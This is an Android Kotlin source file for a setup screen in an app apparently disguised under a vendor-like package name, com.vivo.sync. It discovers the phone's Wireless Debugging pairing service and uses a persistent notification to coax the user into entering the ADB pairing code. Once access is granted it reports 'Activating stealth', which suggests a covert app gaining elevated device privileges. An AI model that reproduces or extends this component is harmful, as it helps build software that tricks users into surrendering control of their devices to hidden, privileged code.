package com.vivo.sync

import android.app.Activity
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.net.nsd.NsdManager
import android.net.nsd.NsdServiceInfo
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.widget.LinearLayout
import android.widget.TextView
import android.widget.Toast
import androidx.core.app.NotificationCompat
import androidx.core.app.RemoteInput

class SetupActivity : Activity() {

    companion object {
        const val CHANNEL_ID = "pairing_channel"
        const val NOTIFICATION_ID = 9999
        const val ACTION_PAIRING_CODE = "com.vivo.sync.ACTION_PAIRING_CODE"
        const val KEY_PAIRING_CODE = "pairing_code"
        const val PAIRING_SERVICE_TYPE = "_adb-tls-pairing._tcp."
    }

    private var nsdManager: NsdManager? = null
    private var discoveryListener: NsdManager.DiscoveryListener? = null
    private lateinit var statusText: TextView
    private val handler = Handler(Looper.getMainLooper())
    private var discoveryActive = false

    // Listen for grant result from PairingReceiver
    private val resultReceiver = object : BroadcastReceiver() {
        override fun onReceive(context: Context, intent: Intent) {
            when (intent.action) {
                "com.vivo.sync.GRANT_SUCCESS" -> {
                    updateStatus("✅ Permission granted! Activating stealth...")
                    handler.postDelayed({
                        setResult(RESULT_OK)
                        finish()
                    }, 1500)
                }
                "com.vivo.sync.GRANT_FAILED" -> {
                    val prefs = getSharedPreferences("pairing", MODE_PRIVATE)
                    val error = prefs.getString("last_error", "Unknown error")
                    updateStatus("❌ $error\n\nTap 'Pair device with pairing code' again.")
                    handler.postDelayed({ showPairingNotification() }, 2000)
                }
            }
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        createNotificationChannel()

        // Register result listener
        val filter = IntentFilter().apply {
            addAction("com.vivo.sync.GRANT_SUCCESS")
            addAction("com.vivo.sync.GRANT_FAILED")
        }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            registerReceiver(resultReceiver, filter, RECEIVER_NOT_EXPORTED)
        } else {
            registerReceiver(resultReceiver, filter)
        }

        // Request notification permission on Android 13+
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            requestPermissions(arrayOf(android.Manifest.permission.POST_NOTIFICATIONS), 300)
        }

        // Dark UI
        val layout = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setBackgroundColor(0xFF0D0D0D.toInt())
            setPadding(60, 120, 60, 60)
        }

        val title = TextView(this).apply {
            text = "⚡ KERNEL BRIDGE"
            textSize = 22f
            setTextColor(0xFFE0E0E0.toInt())
            gravity = android.view.Gravity.CENTER
        }

        statusText = TextView(this).apply {
            text = "Searching for Wireless Debugging pairing service..."
            textSize = 14f
            setTextColor(0xFFAAAAAA.toInt())
            gravity = android.view.Gravity.CENTER
            setPadding(0, 40, 0, 0)
        }

        val instructions = TextView(this).apply {
            text = "\n1. Go to Developer Options → Wireless Debugging\n" +
                    "2. Tap 'Pair device with pairing code'\n" +
                    "3. Enter the 6-digit code in the notification\n"
            textSize = 13f
            setTextColor(0xFF888888.toInt())
            setPadding(0, 30, 0, 0)
        }

        val openWD = android.widget.Button(this).apply {
            text = "Open Wireless Debugging"
            setBackgroundColor(0xFF1A1A2E.toInt())
            setTextColor(0xFF00E5FF.toInt())
            setPadding(0, 30, 0, 30)
            setOnClickListener {
                try {
                    startActivity(Intent(android.provider.Settings.ACTION_APPLICATION_DEVELOPMENT_SETTINGS))
                } catch (e: Exception) {
                    Toast.makeText(context, "Open Settings → Developer Options manually", Toast.LENGTH_LONG).show()
                }
            }
        }

        layout.addView(title)
        layout.addView(statusText)
        layout.addView(instructions)
        layout.addView(openWD)
        setContentView(layout)

        startPairingDiscovery()
    }

    private fun startPairingDiscovery() {
        if (discoveryActive) return
        nsdManager = getSystemService(NSD_SERVICE) as NsdManager

        discoveryListener = object : NsdManager.DiscoveryListener {
            override fun onStartDiscoveryFailed(serviceType: String, errorCode: Int) {
                discoveryActive = false
                runOnUiThread { updateStatus("⚠ Discovery failed (code $errorCode). Retrying...") }
                handler.postDelayed({ startPairingDiscovery() }, 3000)
            }
            override fun onStopDiscoveryFailed(serviceType: String, errorCode: Int) { discoveryActive = false }
            override fun onDiscoveryStarted(serviceType: String) {
                discoveryActive = true
                runOnUiThread { updateStatus("🔍 Scanning for pairing service...\n\nTap 'Pair device with pairing code' in Wireless Debugging") }
            }
            override fun onDiscoveryStopped(serviceType: String) { discoveryActive = false }

            override fun onServiceFound(serviceInfo: NsdServiceInfo) {
                runOnUiThread { updateStatus("📡 Pairing service detected! Resolving...") }
                nsdManager?.resolveService(serviceInfo, object : NsdManager.ResolveListener {
                    override fun onResolveFailed(info: NsdServiceInfo, errorCode: Int) {
                        runOnUiThread { updateStatus("⚠ Resolve failed. Keep pairing dialog open.") }
                    }
                    override fun onServiceResolved(info: NsdServiceInfo) {
                        val host = info.host?.hostAddress ?: "127.0.0.1"
                        val port = info.port

                        // Save to SharedPreferences for PairingReceiver
                        getSharedPreferences("pairing", MODE_PRIVATE).edit()
                            .putString("host", host)
                            .putInt("port", port)
                            .apply()

                        runOnUiThread {
                            updateStatus("✅ Found pairing at $host:$port\n\n⬆ Enter the 6-digit code in the notification above")
                            showPairingNotification()
                        }
                    }
                })
            }

            override fun onServiceLost(serviceInfo: NsdServiceInfo) {
                runOnUiThread { updateStatus("⚠ Pairing dialog closed. Tap 'Pair device' again.") }
                dismissNotification()
            }
        }

        try {
            nsdManager?.discoverServices(PAIRING_SERVICE_TYPE, NsdManager.PROTOCOL_DNS_SD, discoveryListener)
        } catch (e: Exception) {
            updateStatus("⚠ ${e.message}")
        }
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(CHANNEL_ID, "Pairing", NotificationManager.IMPORTANCE_HIGH).apply {
                description = "Enter wireless debugging pairing code"
            }
            (getSystemService(NOTIFICATION_SERVICE) as NotificationManager).createNotificationChannel(channel)
        }
    }

    private fun showPairingNotification() {
        val remoteInput = RemoteInput.Builder(KEY_PAIRING_CODE)
            .setLabel("6-digit pairing code")
            .build()

        val replyIntent = Intent(ACTION_PAIRING_CODE).apply {
            setClass(this@SetupActivity, PairingReceiver::class.java)
        }
        val replyPending = PendingIntent.getBroadcast(this, 0, replyIntent,
            PendingIntent.FLAG_MUTABLE or PendingIntent.FLAG_UPDATE_CURRENT)

        val action = NotificationCompat.Action.Builder(
            android.R.drawable.ic_lock_lock,
            "Enter Pairing Code", replyPending
        ).addRemoteInput(remoteInput).build()

        val notification = NotificationCompat.Builder(this, CHANNEL_ID)
            .setSmallIcon(android.R.drawable.ic_lock_lock)
            .setContentTitle("⚡ Enter Pairing Code")
            .setContentText("Enter the 6-digit code from Wireless Debugging")
            .setPriority(NotificationCompat.PRIORITY_HIGH)
            .setAutoCancel(false)
            .setOngoing(true)
            .addAction(action)
            .build()

        (getSystemService(NOTIFICATION_SERVICE) as NotificationManager).notify(NOTIFICATION_ID, notification)
    }

    private fun dismissNotification() {
        (getSystemService(NOTIFICATION_SERVICE) as NotificationManager).cancel(NOTIFICATION_ID)
    }

    private fun updateStatus(msg: String) {
        statusText.text = msg
    }

    override fun onDestroy() {
        super.onDestroy()
        try { unregisterReceiver(resultReceiver) } catch (e: Exception) {}
        try {
            if (discoveryActive) discoveryListener?.let { nsdManager?.stopServiceDiscovery(it) }
        } catch (e: Exception) {}
        dismissNotification()
    }
}
